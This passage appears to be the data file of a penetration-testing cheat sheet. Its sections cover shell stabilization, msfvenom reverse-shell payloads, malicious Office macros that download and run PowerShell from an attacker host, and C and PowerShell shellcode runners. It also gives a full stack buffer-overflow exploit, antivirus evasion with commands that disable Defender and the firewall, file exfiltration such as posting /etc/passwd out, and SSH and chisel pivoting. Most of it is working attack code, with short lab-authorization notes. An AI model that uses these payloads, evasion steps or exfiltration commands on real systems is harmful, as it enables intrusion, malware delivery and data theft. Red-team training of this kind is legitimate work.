        code: "# Use rlwrap on the listener for readline support (arrow keys, history)\nrlwrap nc -lvnp 4444\n\n# If you get a cmd shell and need PowerShell:\npowershell -ep bypass\n\n# For a proper interactive Windows shell, use evil-winrm or pwncat-cs"
      },

      /* ── Fix TTY Size ── */
      {
        heading: "Fix Terminal Size",
        level: 2,
        content: "After stabilization, the shell may not fill your terminal window. Fix the rows and columns to match your actual terminal size.",
        code: "# On your LOCAL machine (separate terminal), check your terminal size:\nstty -a\n# Look for: rows XX; columns YY\n\n# On the TARGET shell, set matching dimensions:\nstty rows 50 cols 180\nexport TERM=xterm-256color"
      },

      /* ── Quick Reference ── */
      {
        heading: "Quick Reference — Which Method to Use",
        level: 2,
        list: [
          "Python available → Method 1 (python3 pty.spawn) — fastest and most reliable",
          "No Python → Method 2 (script -qc /bin/bash /dev/null)",
          "Socat on target → Method 3 (full TTY from the start, no manual steps)",
          "Need encryption → Method 4 (socat + TLS, avoids IDS detection)",
          "Windows target → rlwrap on listener + evil-winrm or PowerShell",
          "Always set TERM=xterm and fix stty rows/cols after upgrading"
        ]
      }
    ]
  },

  {
    id: "msfvenom_payloads",
    title: "msfvenom Payloads",
    category: "Payload Development",
    icon: "💣",
    sections: [
      {
        heading: "Linux / Windows Basics",
        level: 2,
        code: "# Linux ELF reverse TCP\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf\n\n# Windows x64 exe reverse TCP\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe"
      },
      {
        heading: "Web Payloads",
        level: 2,
        code: "# PHP reverse shell payload\nmsfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php\n\n# ASPX payload\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f aspx -o shell.aspx"
      },
      {
        heading: "Encoders / Badchars",
        level: 2,
        content: "Only use encoders when required by payload constraints; they are not AV bypass magic.",
        code: "msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -b '\\x00\\x0a\\x0d' -e x86/shikata_ga_nai -i 3 -f exe -o shell_enc.exe"
      },

      /* ── Staged vs Stageless ── */
      {
        heading: "Staged vs Stageless",
        level: 2,
        content: "Staged payloads (windows/shell/reverse_tcp with /) are smaller but need a handler to send the second stage. Stageless payloads (windows/shell_reverse_tcp with _) are self-contained and more reliable."
      },

      /* ── Windows Payloads ── */
      {
        heading: "Windows x86",
        level: 2,
        code: "# Staged\nmsfvenom -p windows/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell_staged.exe\n\n# Stageless\nmsfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe"
      },
      {
        heading: "Windows x64",
        level: 2,
        code: "# Staged\nmsfvenom -p windows/x64/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell64_staged.exe\n\n# Stageless\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell64.exe"
      },
      {
        heading: "Windows Shellcode (C / PowerShell)",
        level: 2,
        content: "Raw shellcode for embedding in custom loaders.",
        code: "msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f c\nmsfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f psh-cmd"
      },
      {
        heading: "Windows Other Formats",
        level: 2,
        content: "ASP for IIS, DLL for DLL hijacking, HTA for browser delivery, PS1 for PowerShell.",
        code: "msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f asp -o shell.asp\nmsfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o shell.dll\nmsfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f hta-psh -o shell.hta\nmsfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f psh -o shell.ps1"
      },

      /* ── Linux Payloads ── */
      {
        heading: "Linux ELF",
        level: 2,
        code: "# Stageless (most common)\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf\n\n# Shellcode (C format)\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f c"
      },
      {
        heading: "Format Listing",
        level: 2,
        content: "Common: exe, elf, dll, asp, jsp, war, py, ps1, psh, psh-cmd, hta-psh, c, raw, hex",
        code: "msfvenom --list formats"
      },

      /* ── Handler ── */
      {
        heading: "Multi/Handler Setup",
        level: 2,
        content: "Must match the payload used in msfvenom. Use staged handler for staged payloads.",
        code: "use exploit/multi/handler\nset payload windows/x64/shell_reverse_tcp\nset LHOST ATTACKER_IP\nset LPORT 4444\nrun"
      }
    ]
  },

  {
    id: "malicious_macros",
    title: "Malicious Macros",
    category: "Initial Access",
    icon: "📄",
    sections: [
      {
        heading: "What to Know",
        level: 2,
        content: "Macro-enabled documents (VBA) are a common initial-access vector in phishing simulations and red-team labs. Modern Office protections reduce success rate, so operator tradecraft and environment context matter."
      },
      {
        heading: "Minimal VBA Execution Pattern",
        level: 2,
        code: "Sub AutoOpen()\n    Dim cmd As String\n    cmd = \"powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/a.ps1')\"\n    CreateObject(\"Wscript.Shell\").Run cmd, 0\nEnd Sub"
      },
      {
        heading: "Common Delivery Notes",
        level: 2,
        list: [
          "Use macro-enabled formats (.docm/.xlsm)",
          "Test in isolated lab mail and endpoint stack first",
          "Host staged payloads on controlled infrastructure",
          "Plan fallback methods if VBA is blocked by policy"
        ]
      },
      {
        heading: "Defensive Signals (for reporting)",
        level: 2,
        list: [
          "Office spawning script interpreters (powershell/cmd/wscript)",
          "Suspicious outbound callbacks after document open",
          "Encoded command lines and hidden window flags",
          "Macro execution events in Office and endpoint telemetry"
        ]
      },
      {
        heading: "Engagement Safety",
        level: 2,
        content: "Only use macro testing with explicit authorization and scope. Prefer simulation payloads/non-destructive commands during validation and capture IOC details for blue-team handoff."
      },

      /* ── Additional Macro Types ── */
      {
        heading: "NTLMv2 Capture via Macro",
        level: 2,
        content: "Force the victim machine to authenticate to your SMB listener — capture NTLMv2 hash without code execution.",
        code: "' Macro payload\nSub AutoOpen()\n  CreateObject(\"Wscript.Shell\").Run \"cmd /c dir \\\\ATTACKER_IP\\share\"\nEnd Sub\n\n' On attacker — run Responder\nsudo responder -I tun0"
      },
      {
        heading: "LibreOffice Macro",
        level: 2,
        content: "Tools → Macros → Organize → Basic → assign macro to Open Document event.",
        code: "Sub Main\n  Shell(\"cmd /c powershell -ep bypass -nop IWR -uri http://ATTACKER_IP/shell.ps1 -OutFile C:\\Windows\\Temp\\shell.ps1; C:\\Windows\\Temp\\shell.ps1\")\nEnd Sub"
      },
      {
        heading: "macro-generator.py",
        level: 2,
        content: "Generates AutoOpen/Document_Open VBA stagers. Supports .doc VBA-EXE method, IWR cradle, and LibreOffice ODT.",
        code: "python3 macro-generator.py ATTACKER_IP LPORT"
      }
    ]
  },

  {
    id: "buffer_overflows",
    title: "Buffer Overflows",
    category: "Binary Exploitation",
    icon: "🧩",
    sections: [
      {
        heading: "Windows API Fundamentals",
        level: 2,
        content: "Understanding these Win32 APIs is essential for shellcode execution and process injection. These are the building blocks for custom shellcode runners and injection techniques.",
        list: [
          "VirtualAlloc — Allocates memory in the current process (RWX). Used to create executable memory regions for shellcode.",
          "CreateThread — Creates a new thread in the current process pointing to shellcode in allocated memory.",
          "VirtualAllocEx — Allocates memory in a REMOTE process. Used for process injection.",
          "WriteProcessMemory — Writes shellcode into a remote process's allocated memory region.",
          "CreateRemoteThread — Creates a thread in a remote process to execute the injected shellcode.",
          "WaitForSingleObject — Pauses execution until the shellcode thread completes. Prevents the program from exiting prematurely."
        ]
      },
      {
        heading: "C Shellcode Runner",
        level: 2,
        content: "Basic pattern for executing shellcode in C on Windows. Allocates RWX memory, copies shellcode, and executes via a new thread. Compile with MinGW for cross-compilation from Linux.",
        code: "#include <windows.h>\n\nunsigned char buf[] = \n\"\\xfc\\x48\\x83...\"  // msfvenom shellcode here\n\nint main(void) {\n    void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    memcpy(exec, buf, sizeof(buf));\n    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);\n    WaitForSingleObject(hThread, INFINITE);\n    return 0;\n}\n\n// Compile (Linux → Windows):\n// x86_64-w64-mingw32-gcc runner.c -o runner.exe -lws2_32"
      },
      {
        heading: "PowerShell Shellcode Runner (Reflection)",
        level: 2,
        content: "Uses .NET reflection to call Win32 APIs directly from PowerShell without compiling. Useful when you can only execute PowerShell on the target.",
        code: "$Kernel32 = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Kernel32 {\n    [DllImport(\"kernel32\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n    [DllImport(\"kernel32\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n    [DllImport(\"kernel32\")] public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n}\n\"@\nAdd-Type $Kernel32\n\n[Byte[]] $buf = 0xfc,0x48,0x83...  # msfvenom -p windows/x64/meterpreter/reverse_https -f ps1\n\n$size = $buf.Length\n[IntPtr]$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40)\n[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)\n$hThread = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0)\n[Kernel32]::WaitForSingleObject($hThread, [uint32]\"0xFFFFFFFF\")"
      },
      {
        heading: "Classic BOF — 7-Step Process",
        level: 2,
        content: "The classic stack-based buffer overflow exploitation workflow for 32-bit applications without modern protections. Typically encountered in OSCP-style labs and older software.",
        numbered: true,
        list: [
          "Spiking — Identify which input parameter is vulnerable by sending large payloads to each input field",
          "Fuzzing — Send incrementally larger payloads to determine the approximate buffer size that causes a crash",
          "Finding the Offset — Use Metasploit's pattern_create to generate a unique pattern, send it, and find the exact offset to EIP",
          "Confirming EIP Control — Send offset × 'A' + 'BBBB' and verify EIP = 42424242 in the debugger",
          "Finding Bad Characters — Send all possible bytes (\\x00-\\xff) after EIP to identify characters that break the shellcode",
          "Finding the JMP ESP — Use mona.py to locate a JMP ESP instruction in a module without ASLR/SafeSEH/Rebase",
          "Generating Shellcode & Exploit — Create shellcode excluding bad chars, prepend NOP sled, build final payload"
        ]
      },
      {
        heading: "Step 1: Spiking",
        level: 3,
        content: "Use spike to send large inputs to each parameter and monitor the application for crashes in Immunity Debugger.",
        code: "# spike template (test.spk)\ns_readline();\ns_string(\"COMMAND \");\ns_string_variable(\"FUZZ\");\n\n# Run spike\ngeneric_send_tcp TARGET_IP PORT test.spk 0 0"
      },
      {
        heading: "Step 2: Fuzzing",
        level: 3,
        content: "Send increasingly larger buffers to find the approximate crash point. Record the exact size that causes the crash.",
        code: "#!/usr/bin/env python3\nimport socket, sys\n\ntarget_ip = \"TARGET_IP\"\ntarget_port = PORT\nbuffer = b\"A\" * 100\n\nwhile True:\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(5)\n        s.connect((target_ip, target_port))\n        s.recv(1024)\n        print(f\"Sending {len(buffer)} bytes...\")\n        s.send(b\"COMMAND \" + buffer + b\"\\r\\n\")\n        s.recv(1024)\n        s.close()\n        buffer += b\"A\" * 100\n    except:\n        print(f\"Crashed at {len(buffer)} bytes\")\n        sys.exit(0)"
      },
      {
        heading: "Step 3: Find Exact Offset",
        level: 3,
        code: "# Generate unique pattern (use crash size + buffer)\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000\n\n# Send the pattern as payload, note the EIP value after crash\n# Then calculate offset:\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_VALUE>\n# Example: pattern_offset.rb -q 39654138  →  Exact offset: 524"
      },
      {
        heading: "Step 4: Confirm EIP Control",
        level: 3,
        content: "Verify you control EIP by placing a known value at the exact offset. EIP should show 42424242 (BBBB) in the debugger.",
        code: "#!/usr/bin/env python3\nimport socket\n\noffset = 524  # from pattern_offset\nbuffer = b\"A\" * offset + b\"B\" * 4 + b\"C\" * (3000 - offset - 4)\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"TARGET_IP\", PORT))\ns.send(b\"COMMAND \" + buffer + b\"\\r\\n\")\ns.close()\n\n# Check debugger: EIP should be 42424242"
      },
      {
        heading: "Step 5: Bad Characters",
        level: 3,
        content: "Send all 256 possible bytes and examine the hex dump in the debugger. Any byte that's missing, truncated, or mangled is a bad character. \\x00 (null) is almost always bad.",
        code: "# Generate bad char test array (all bytes except \\x00)\nbadchars = (\n  b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\"\n  b\"\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\"\n  b\"\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\"\n  b\"\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\"\n  b\"\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\"\n  b\"\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\"\n  b\"\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\"\n  b\"\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\"\n  b\"\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\"\n  b\"\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\"\n  b\"\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\"\n  b\"\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\"\n  b\"\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\"\n  b\"\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\"\n  b\"\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\"\n  b\"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n)\n\nbuffer = b\"A\" * offset + b\"B\" * 4 + badchars\n# Send and examine hex dump — compare sequentially\n# Remove bad chars one at a time and resend\n\n# mona.py alternative (in Immunity Debugger):\n!mona bytearray -b \"\\x00\"              # Generate comparison file\n!mona compare -f bytearray.bin -a ESP  # Auto-compare with stack"
      },
      {
        heading: "Step 6: Find JMP ESP",
        level: 3,
        content: "Use mona.py in Immunity Debugger to find a JMP ESP instruction in a module without ASLR, SafeSEH, or Rebase. This address replaces EIP and redirects execution to the stack.",
        code: "# In Immunity Debugger:\n!mona modules\n# Look for modules where Rebase=False, SafeSEH=False, ASLR=False\n\n# Find JMP ESP (opcode: \\xff\\xe4) in that module\n!mona find -s \"\\xff\\xe4\" -m MODULE_NAME.dll\n\n# Note the address (e.g., 0x625011AF)\n# Use this address in LITTLE ENDIAN format in your exploit:\n# 0x625011AF → \\xaf\\x11\\x50\\x62"
      },
      {
        heading: "Step 7: Final Exploit",
        level: 3,
        content: "Generate shellcode excluding bad characters, prepend a NOP sled (\\x90) to give the decoder room, and build the final payload.",
        code: "# Generate shellcode (exclude identified bad chars)\nmsfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -b \"\\x00\\x0a\\x0d\" -f python -v shellcode\n\n# Final exploit script\n#!/usr/bin/env python3\nimport socket\n\ntarget_ip = \"TARGET_IP\"\ntarget_port = PORT\noffset = 524\n\n# JMP ESP address (little endian)\njmp_esp = b\"\\xaf\\x11\\x50\\x62\"\n\n# NOP sled — gives shellcode decoder room to work\nnop_sled = b\"\\x90\" * 16\n\n# msfvenom shellcode (paste generated shellcode here)\nshellcode = b\"\"\nshellcode += b\"\\xdb\\xce\\xd9\\x74\\x24...\"  # truncated for display\n\nbuffer = b\"A\" * offset + jmp_esp + nop_sled + shellcode\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((target_ip, target_port))\ns.send(b\"COMMAND \" + buffer + b\"\\r\\n\")\ns.close()\nprint(\"Exploit sent!\")"
      },
      {
        heading: "Memory Protection Bypass",
        level: 2,
        content: "Modern systems use multiple protections. Understanding what each does and how to bypass it is critical for real-world exploitation.",
        list: [
          "DEP / NX (Data Execution Prevention) — Marks stack/heap as non-executable. Bypass: ROP chains (Return-Oriented Programming) using existing code gadgets, ret2libc.",
          "ASLR (Address Space Layout Randomization) — Randomizes base addresses of modules/stack/heap. Bypass: Information leaks to disclose addresses, target non-ASLR modules, brute force (32-bit only).",
          "Stack Canaries — Random value placed before return address, checked on function return. Bypass: Information leak to read canary value, brute force one byte at a time (forking servers).",
          "SafeSEH — Validates exception handler addresses against a whitelist. Bypass: Use modules compiled without SafeSEH.",
          "PIE (Position Independent Executable) — Randomizes the main binary's base address. Bypass: Requires info leak, often combined with ASLR bypass."
        ]
      },
      {
        heading: "Lab Notes",
        level: 2,
        content: "Buffer overflow exploitation should only be performed in authorized labs and CTFs. Keep exploit scripts deterministic and log the exact target binary hash and build for reproducibility. Always start the debugger fresh between attempts to ensure a clean state."
      }
    ]
  },

  {
    id: "av_evasion",
    title: "AV & Defender Evasion",
    category: "Exploitation",
    icon: "🛡️",
    sections: [
      {
        heading: "Overview",
        level: 2,
        content: "Evasion techniques bypass endpoint protection (AV, EDR, AMSI) so payloads execute on target. Methods range from simple encoding to custom compilation. Always test payloads against the target's defenses in a lab first."
      },

      /* ── Encoding & Packing ── */
      {
        heading: "msfvenom Encoding",
        level: 2,
        content: "Encoding alone rarely bypasses modern AV but can help defeat basic signature scanners or remove bad characters.",
        code: "msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -i 7 -f exe -o encoded.exe"
      },
      {
        heading: "UPX Packing",
        level: 2,
        content: "Packs the binary to change its signature. Not evasion on its own, but useful in combination.",
        code: "upx --best shell.exe -o packed.exe"
      },
      {
        heading: "Shellter (PE Injection)",
        level: 2,
        content: "Injects shellcode into a legitimate 32-bit PE. Run in auto mode for quick weaponization.",
        code: "shellter\n# Mode: A (auto)\n# PE Target: /path/to/legit.exe\n# Payload: custom / listed\n# LHOST / LPORT"
      },
      {
        heading: "Veil Framework",
        level: 2,
        content: "Generates AV-evading payloads in various languages (C, Python, Go, PowerShell).",
        code: "veil\nuse 1            # Evasion\nlist             # Show payload options\nuse <payload-number>\nset LHOST ATTACKER_IP\nset LPORT 4444\ngenerate"
      },
      {
        heading: "Donut (.NET Shellcode)",
        level: 2,
        content: "Converts .NET assemblies/EXEs/DLLs into position-independent shellcode for injection.",
        code: "donut -f payload.exe -o payload.bin"
      },

      /* ── Obfuscation ── */
      {
        heading: "PowerShell Obfuscation (Invoke-Obfuscation)",
        level: 2,
        content: "Heavily obfuscates PS commands/scripts to evade AMSI and string-based detection.",
        code: "Import-Module ./Invoke-Obfuscation.psd1\nInvoke-Obfuscation\nSET SCRIPTBLOCK 'IEX (IWR http://ATTACKER_IP/shell.ps1)'\nTOKEN\\ALL\\1\nOUT output.ps1"
      },
      {
        heading: "Base64 Encoding (PowerShell)",
        level: 2,
        content: "Encode PS commands to avoid plaintext detection. Generate encoded payload on attacker machine.",
        code: "echo -n 'IEX(IWR http://ATTACKER_IP/shell.ps1 -UseBasicParsing)' | iconv -f ASCII -t UTF-16LE | base64 | tr -d '\\n'\npowershell -nop -exec bypass -enc <BASE64>"
      },
      {
        heading: "XOR / Hex Obfuscation",
        level: 2,
        content: "XOR shellcode with a key before embedding; decoder stub reverses it at runtime. Use hex encoding as an alternative.",
        code: "# Python XOR example\\nimport sys\\nkey = 0x42\\nwith open('payload.bin','rb') as f: buf = f.read()\\nenc = bytes([b ^ key for b in buf])\\nprint(','.join(f'0x{b:02x}' for b in enc))"
      },

      /* ── Compilation ── */
      {
        heading: "Manual Compilation",
        level: 2,
        content: "Custom C/C++ loaders avoid signature hits. Cross-compile for Windows from Linux with mingw.",
        code: "# 64-bit Windows EXE\\nx86_64-w64-mingw32-gcc shell.c -o shell.exe -lws2_32\\n\\n# 32-bit\\ni686-w64-mingw32-gcc shell.c -o shell32.exe -lws2_32"
      },

      /* ── Network Evasion ── */
      {
        heading: "Nmap Evasion Techniques",
        level: 2,
        content: "Evade IDS/IPS during scanning.",
        code: "nmap -D RND:10 TARGET_IP               # Decoy scan\\nnmap --data-length 25 TARGET_IP         # Pad packets\\nnmap -f TARGET_IP                       # Fragment packets\\nnmap -S SPOOF_IP -e tun0 TARGET_IP      # Spoof source"
      },

      /* ── Disabling Defenses ── */
      {
        heading: "Disable Windows Defender",
        level: 2,
        content: "Requires admin/SYSTEM. Useful post-exploitation to run tools freely.",
        code: "Set-MpPreference -DisableRealtimeMonitoring $true\\nSet-MpPreference -DisableIOAVProtection $true"
      },
      {
        heading: "Disable Windows Firewall",
        level: 2,
        code: "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
      },
      {
        heading: "Enable RDP (Post-Exploitation)",
        level: 2,
        code: "Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'fDenyTSConnections' -Value 0\\nEnable-NetFirewallRule -DisplayGroup 'Remote Desktop'"
      }
    ]
  },

  {
    id: "file_transfers",
    title: "File Transfers",
    category: "Operations",
    icon: "📦",
    sections: [
      {
        heading: "HTTP-based",
        level: 2,
        code: "# Attacker host files\npython3 -m http.server 8000\n\n# Linux target download\nwget http://ATTACKER_IP:8000/tool -O /tmp/tool\ncurl http://ATTACKER_IP:8000/tool -o /tmp/tool\n\n# Windows target download\ncertutil -urlcache -split -f http://ATTACKER_IP:8000/tool.exe tool.exe\npowershell -c \"iwr http://ATTACKER_IP:8000/tool.exe -OutFile tool.exe\""
      },
      {
        heading: "Netcat / Socat",
        level: 2,
        code: "# Sender (attacker)\nnc -lvnp 9002 < linpeas.sh\n\n# Receiver (target)\nnc ATTACKER_IP 9002 > /tmp/linpeas.sh"
      },
      {
        heading: "SMB / SCP",
        level: 2,
        code: "# SCP upload\nscp file.txt user@target:/tmp/file.txt\n\n# SCP download\nscp user@target:/tmp/loot.txt ./loot.txt"
      },
      {
        heading: "When Downloads Are Blocked",
        level: 2,
        list: [
          "Use base64 chunking + decode on target",
          "Leverage existing admin tools (certutil, bitsadmin, powershell iwr)",
          "Rename binaries/extensions if filtering is extension-based",
          "Validate hashes after transfer to avoid corrupted tooling"
        ]
      },

      /* ── Additional Transfer Methods ── */
      {
        heading: "xfreerdp3 Drive Share",
        level: 2,
        content: "Mount a local folder as a shared drive on the RDP session.",
        code: "xfreerdp3 /v:TARGET_IP /u:USER /p:PASS /dynamic-resolution /drive:stuff,/tmp/stuff"
      },
      {
        heading: "SMB Exfiltration",
        level: 2,
        code: "# Attacker — start authenticated SMB share\nimpacket-smbserver share $(pwd) -smb2support -user hacker -password hacker123\n\n# Target — connect and copy\nnet use \\\\ATTACKER_IP\\share /u:hacker hacker123\ncopy loot.txt \\\\ATTACKER_IP\\share\\"
      },
      {
        heading: "FTP Upload",
        level: 2,
        code: "# Attacker — writable FTP server\npython3 -m pyftpdlib -w -p 21\n\n# Target\nftp ATTACKER_IP"
      },
      {
        heading: "/dev/tcp Transfer",
        level: 2,
        content: "Pure bash — no external tools needed. Works when curl/wget are missing.",
        code: "# Sender\nnc -lvnp 7777 < file\n\n# Receiver\ncat < /dev/tcp/SENDER_IP/7777 > file"
      },
      {
        heading: "Exfiltrate via POST",
        level: 2,
        code: "# Target — send file\nwget --post-file=/etc/passwd ATTACKER_IP\n\n# Attacker — listen\nnc -lvp 80"
      },
      {
        heading: "Encoded PowerShell Download",
        level: 2,
        content: "Base64-encode a PS command to bypass logging or string-based restrictions.",
        code: "echo -n '<powershell-command>' | iconv -f ASCII -t UTF-16LE | base64 | tr -d '\\n'\npowershell.exe -nop -exec bypass -enc <ENCODED-OUTPUT>"
      }
    ]
  },

  {
    id: "tunneling_options",
    title: "Tunneling & Pivoting",
    category: "Post-Exploitation",
    icon: "🛰️",
    sections: [
      {
        heading: "Overview",
        level: 2,
        content: "Use tunneling/pivoting when your foothold can reach internal services your attack box cannot. Pick the tool based on whether you need a single forwarded port, a SOCKS proxy, or full subnet routing.\n\nPivoting converts a compromised host into a relay for deeper network access. The tool choice depends on the protocols available, detection risk, and whether you need single-port forwarding, a SOCKS proxy, or full TUN-level subnet routing."
      },

      /* ── SSH Tunneling ── */
      {
        heading: "SSH Tunneling",
        level: 2,
        content: "SSH is the most common pivot mechanism on Linux hosts. Four main modes:"
      },
      {
        heading: "Local Port Forward (-L)",
        level: 3,
        content: "Expose a remote internal service on your local machine. Traffic flows: your localhost → SSH server → target.",
        code: "# Access internal RDP through jump host\nssh -L 3389:10.10.20.15:3389 user@jump-host\n\n# Access internal web app\nssh -L 8080:172.16.0.50:80 user@jump-host\n\n# Then connect locally:\nrdesktop 127.0.0.1:3389\ncurl http://127.0.0.1:8080"
      },
      {
        heading: "Remote Port Forward (-R)",
        level: 3,
        content: "Expose your local service on the remote side. Useful for getting callbacks from internal hosts.",
        code: "# Make your local port 80 accessible on jump host port 8080\nssh -R 8080:127.0.0.1:80 user@jump-host\n\n# Make your listener reachable inside the network\nssh -R 4444:127.0.0.1:4444 user@jump-host"
      },
      {
        heading: "Dynamic SOCKS Proxy (-D)",
        level: 3,
        content: "Creates a SOCKS4/5 proxy. Route arbitrary traffic through proxychains.",
        code: "# Create SOCKS proxy on local port 1080\nssh -D 1080 user@jump-host\n\n# Configure /etc/proxychains4.conf:\n#   socks5 127.0.0.1 1080\n\n# Then use any tool through the proxy:\nproxychains nmap -sT -Pn 10.10.20.0/24\nproxychains curl http://172.16.0.50\nproxychains evil-winrm -i 10.10.20.15 -u admin -p pass"
      },
      {
        heading: "Remote Dynamic SOCKS (-R with SOCKS)",
        level: 3,
        content: "Opens a SOCKS proxy on the remote host. Useful when you have outbound SSH from victim but need inbound routing from the victim side.",
        code: "# From victim (reverse dynamic proxy)\nssh -R 1080 attacker@ATTACKER_IP\n\n# On attacker: proxychains now routes through victim\nproxychains nmap -sT -Pn 10.10.20.0/24"
      },
      {
        heading: "SSH Tunneling Tips",
        level: 3,
        list: [
          "Add -N (no shell) and -f (background) for clean tunnel sessions: ssh -N -f -D 1080 user@host",
          "Use -o StrictHostKeyChecking=no in lab environments to avoid prompts",
          "Stack multiple -L flags for forwarding several ports at once",
          "Use ~/.ssh/config entries to simplify repeated tunnel commands",
          "Check for SSH keys on compromised hosts: find / -name id_rsa 2>/dev/null"
        ]
      },

      /* ── Chisel ── */
      {
        heading: "Chisel",
        level: 2,
        content: "HTTP/WebSocket-based tunnel tool. Works where SSH is blocked but HTTP/HTTPS is allowed. Single binary, cross-platform."
      },
      {
        heading: "Reverse SOCKS Proxy",
        level: 3,
        content: "Most common chisel pattern — victim connects back to attacker and opens a SOCKS proxy.",
        code: "# Attacker: start chisel server\nchisel server --reverse -p 8000\n\n# Victim: connect back, open reverse SOCKS\nchisel client ATTACKER_IP:8000 R:socks\n\n# Attacker: SOCKS5 proxy is now on 127.0.0.1:1080\n# Configure proxychains:\n#   socks5 127.0.0.1 1080\nproxychains nmap -sT -Pn 10.10.20.0/24"
      },
      {
        heading: "Port Forwarding",
        level: 3,
        content: "Forward specific ports instead of full SOCKS.",
        code: "# Forward victim's internal 172.16.0.50:80 to attacker's localhost:8080\n# Attacker\nchisel server --reverse -p 8000\n# Victim\nchisel client ATTACKER_IP:8000 R:8080:172.16.0.50:80\n\n# Attacker can now access: curl http://127.0.0.1:8080"
      },
      {
        heading: "FoxyProxy Configuration",
        level: 3,
        content: "Configure FoxyProxy in your browser to use the chisel SOCKS proxy for web-based internal access.",
        list: [
          "Install FoxyProxy extension in Firefox",
          "Add proxy: SOCKS5, 127.0.0.1, port 1080",
          "Set pattern matching for internal IP ranges (10.*, 172.16.*, 192.168.*)",
          "Enable the profile — browser traffic matching those ranges routes through chisel"
        ]
      },
      {
        heading: "Windows Chisel Usage",
        level: 3,
